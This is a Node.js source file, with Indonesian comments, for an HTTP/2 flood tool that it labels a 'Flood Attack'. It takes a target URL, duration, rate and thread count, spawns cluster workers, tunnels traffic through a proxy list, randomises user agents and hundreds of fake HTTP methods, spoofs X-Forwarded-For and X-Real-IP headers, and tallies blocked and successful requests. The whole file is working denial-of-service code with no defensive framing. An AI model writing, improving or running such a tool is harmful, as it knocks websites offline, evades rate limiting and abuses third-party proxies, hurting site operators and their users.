const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node raw js url time rate threads\nExample: node tls.js https://example.com/ 120 16 4`); 
    console.log(`Atau tanpa proxy: node raw.js https://example.com/ 120 16 4 --noproxy`);
    process.exit();
}

// Cek apakah menggunakan proxy atau langsung
const useProxy = process.argv[6] !== "--noproxy";

// Support TLS 1.2 dan 1.3
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const secureContextOptions = {
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
};

const secureContext = tls.createSecureContext(secureContextOptions);

// Load proxies jika ada
var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️  No proxy.txt found, using direct connection`);
    }
}

// User Agents built-in
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
];

// ==================== 200 HTTP/2 METHODS ====================
const http2Methods = [
    "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT",
    "ACL", "BASELINE-CONTROL", "BIND", "CHECKIN", "CHECKOUT", "COPY", "LABEL", "LINK", "LOCK",
    "MERGE", "MKACTIVITY", "MKCALENDAR", "MKCOL", "MKREDIRECTREF", "MKWORKSPACE", "MOVE", "ORDERPATCH",
    "PRI", "PROPFIND", "PROPPATCH", "REBIND", "REPORT", "SEARCH", "UNBIND", "UNCHECKOUT", "UNLINK",
    "UNLOCK", "UPDATE", "UPDATEREDIRECTREF", "VERSION-CONTROL", "CALENDAR-ACCESS", "CALDAV",
    "COLLECTION", "DAV", "DAV-SYNC", "DAV-VERSION", "DISCOVER", "INVITE", "MULTI", "NOTIFY",
    "POLL", "SUBSCRIBE", "UNSUBSCRIBE", "X-MS-ENUMATTS", "BATCH", "CANCEL", "CHECKOUT", "CLONE",
    "EDIT", "EXTEND", "FIND", "FINISH", "GATEWAY", "HELP", "HOME", "IMAP", "INFO", "MIME",
    "MODIFY", "NOTIFY", "PREVIEW", "QUERY", "RENAME", "REPLY", "REVOKE", "RPC", "SESSION", "STREAM",
    "TIMEOUT", "TRANSFER", "XMPP", "X-PING", "X-PURGE", "X-REQUEST", "X-SESSION", "X-USER", "X-VERSION",
    "ADD", "ALERT", "AUTH", "BACKUP", "BROWSE", "CLEAN", "COMMIT", "COMPRESS", "CONFIGURE", "CREATE",
    "DECOMPRESS", "DEL", "DELIVER", "DEPLOY", "DESCRIBE", "DIFF", "DISPATCH", "ENCODE", "ENCRYPT",
    "EXEC", "EXECUTE", "EXPORT", "EXTRACT", "FETCH", "FILTER", "FORK", "FREEZE", "GENERATE", "GRAPH",
    "HANDSHAKE", "HASH", "IDENTIFY", "IMPORT", "INDEX", "INIT", "INJECT", "INSTALL", "INTEGRATE",
    "INTERCEPT", "INVOKE", "JOIN", "KEYGEN", "KILL", "LISTEN", "LOAD", "LOG", "LOGOUT", "MAP",
    "MASK", "MEASURE", "MIGRATE", "MIRROR", "MONITOR", "MOUNT", "NAVIGATE", "NETWORK", "OPEN", "PACK",
    "PARSE", "PARTITION", "PAUSE", "PING", "PLUGIN", "PORT", "PREPARE", "PROCESS", "PROGRAM", "PROPAGATE",
    "PROTECT", "PUBLISH", "QUARANTINE", "QUERY", "QUEUE", "QUIT", "READ", "REBOOT", "RECEIVE", "RECONNECT",
    "RECORD", "RECOVER", "REDIRECT", "REDO", "REFRESH", "REGISTER", "RELEASE", "RELOAD", "REMOTE", "REMOVE",
    "RENDER", "REPAIR", "REPLACE", "REPLAY", "REPLICATE", "RESET", "RESIZE", "RESOLVE", "RESPAWN", "RESTART",
    "RESTORE", "RESUME", "RETRY", "REVERT", "REWRITE", "RING", "ROLLBACK", "ROTATE", "RUN", "SCAN",
    "SCHEDULE", "SCRAPE", "SCREEN", "SCRIPT", "SEAL", "SECURE", "SEND", "SEQUENCE", "SERVE", "SET",
    "SHARE", "SHOW", "SHUTDOWN", "SIGN", "SIZE", "SKIP", "SORT", "SPAWN", "SPLIT", "SPY", "STACK",
    "STAGE", "START", "STAT", "STOP", "STORE", "SUBMIT", "SUPER", "SWAP", "SWITCH", "SYNC", "SYNTHESIZE",
    "TAG", "TEST", "THAW", "TOKEN", "TRANSCODE", "TRANSFORM", "TRANSLATE", "TUNNEL", "TYPE", "UNFREEZE",
    "UNMOUNT", "UNPACK", "UNREGISTER", "UNTAG", "UNWRAP", "UPLOAD", "UPGRADE", "USE", "VALIDATE", "VERIFY",
    "VIEW", "WAIT", "WATCH", "WRAP", "WRITE", "XML", "YANK", "ZIP"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// Statistik global
let stats = {
    total: 0,
    success: 0,
    blocked: 0,
    error: 0,
    active: 0
};

if (cluster.isMaster) {
    console.log(`🔥 Starting Flood Attack`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🔒 TLS Version: 1.2 & 1.3`);
    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
    console.log(`📡 HTTP/2 Methods: 200 different methods`);
    console.log(`====================================`);
    
    // Live stats setiap 3 detik
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
        console.log(`   Total: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        console.log(`   🔗 Active: ${stats.active}`);
    }, 3000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        console.log(`📊 Final Stats:`);
        console.log(`   Total Requests: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // Worker processes
    console.log(`Worker ${cluster.worker.id} started`);
    
    // Multiple intervals per worker untuk rate yang lebih tinggi
    const intervalsPerWorker = Math.min(2000, args.Rate);
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 10000) {
                    runFlooder();
                }
            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
        }, i * 1);
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
}

// Fungsi untuk mendapatkan method HTTP/2 acak dari 200 methods
function getRandomHttp2Method() {
    return randomElement(http2Methods);
}

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn) => {
        const settings = {
            enablePush: false,
            initialWindowSize: 2147483647,
            maxConcurrentStreams: 1000
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS12,
            requestCert: false,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        // Jika ada proxy connection, gunakan socket dari proxy
        if (proxyConn) {
            tlsOptions.socket = proxyConn;
        }

        const tlsConn = proxyConn ? 
            tls.connect(443, parsedTarget.host, tlsOptions) :
            tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        let requestInterval;
        
        tlsConn.once("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                createConnection: () => tlsConn,
                maxSessionMemory: 1000
            });

            client.setMaxListeners(0);
            
            const startTime = Date.now();
            
            requestInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                if (elapsed > args.time * 1000) {
                    clearInterval(requestInterval);
                    client.destroy();
                    if (proxyConn) proxyConn.destroy();
                    stats.active--;
                    return;
                }
                
                // Kirim request dengan method acak dari 200 methods
                const randomPath = parsedTarget.path + 
                    (Math.random() > 0.5 ? "?" + randomString(8) + "=" + randomString(6) : "");
                
                const randomMethod = getRandomHttp2Method();
                
                const headers = {
                    [":method"]: randomMethod,
                    [":path"]: randomPath,
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": randomElement(userAgents),
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "accept-language": "en-US,en;q=0.9",
                    "accept-encoding": "gzip, deflate, br",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "referer": "https://" + parsedTarget.host,
                    "x-forwarded-for": randomIP(),
                    "x-real-ip": randomIP(),
                    "x-http-method-override": randomMethod,
                    "x-method": randomMethod
                };
                
                // Tambahkan body untuk method POST, PUT, PATCH dll
                let body = null;
                if (["POST", "PUT", "PATCH", "UPDATE", "CREATE", "MODIFY", "ADD", "EDIT", "SET", "STORE", "UPLOAD", "SEND", "SUBMIT", "DEPLOY", "INSTALL", "IMPORT", "INJECT", "WRITE", "PACK", "ENCODE", "ENCRYPT", "COMPRESS", "EXECUTE"].includes(randomMethod)) {
                    body = JSON.stringify({
                        _method: randomMethod,
                        _timestamp: Date.now(),
                        _random: randomString(16),
                        _id: Math.random().toString(36).substring(2),
                        data: randomString(32),
                        payload: randomString(64),
                        token: crypto.randomBytes(16).toString('hex')
                    });
                }
                
                try {
                    const request = client.request(headers);
                    
                    // Kirim body jika ada
                    if (body) {
                        request.write(body);
                    }
                    
                    request.on("response", (responseHeaders) => {
                        const statusCode = responseHeaders[":status"];
                        stats.total++;
                        
                        if (statusCode === 200 || statusCode === 201 || statusCode === 202 || statusCode === 204 || 
                            statusCode === 301 || statusCode === 302 || statusCode === 303 || statusCode === 307 || statusCode === 308) {
                            stats.success++;
                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429 || statusCode === 405 || statusCode === 501) {
                            stats.blocked++;
                        } else {
                            stats.error++;
                        }
                        
                        request.close();
                        request.destroy();
                    });
                    
                    request.on("error", () => {
                        stats.total++;
                        stats.error++;
                    });
                    
                    request.end(body ? undefined : () => {});
                    
                } catch(e) {
                    stats.total++;
                    stats.error++;
                }
            }, Math.max(10, Math.floor(1000 / args.Rate)));
            
            client.requestInterval = requestInterval;
        });

        tlsConn.on("error", (err) => {
            if (requestInterval) clearInterval(requestInterval);
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        if (proxyConn) {
            proxyConn.on("error", () => {
                if (requestInterval) clearInterval(requestInterval);
                tlsConn.destroy();
                stats.active--;
            });
            
            proxyConn.on("close", () => {
                if (requestInterval) clearInterval(requestInterval);
                stats.active--;
            });
        }
        
        tlsConn.on("close", () => {
            if (requestInterval) clearInterval(requestInterval);
            stats.active--;
        });
    };
    
    // Jika menggunakan proxy
    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr) {
            const parsedProxy = proxyAddr.split(":");
            if (parsedProxy.length >= 2) {
                const proxyConn = net.connect({
                    host: parsedProxy[0],
                    port: ~~parsedProxy[1],
                    allowHalfOpen: true
                });
                
                proxyConn.setTimeout(10000);
                proxyConn.setKeepAlive(true, 30000);
                
                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + randomElement(userAgents) + "\r\n\r\n";
                
                proxyConn.on("connect", () => {
                    proxyConn.write(payload);
                });
                
                proxyConn.on("data", (chunk) => {
                    const response = chunk.toString();
                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
                        proxyConn.removeAllListeners("data");
                        makeRequest(proxyConn);
                    } else {
                        proxyConn.destroy();
                        stats.active--;
                    }
                });
                
                proxyConn.on("error", () => {
                    stats.active--;
                });
                
                proxyConn.on("timeout", () => {
                    proxyConn.destroy();
                    stats.active--;
                });
                
                return;
            }
        }
    }
    
    // Direct connection (tanpa proxy)
    makeRequest(null);
}

process.on('uncaughtException', (error) => {
    if (stats.active > 0) stats.active--;
});
process.on('unhandledRejection', (error) => {});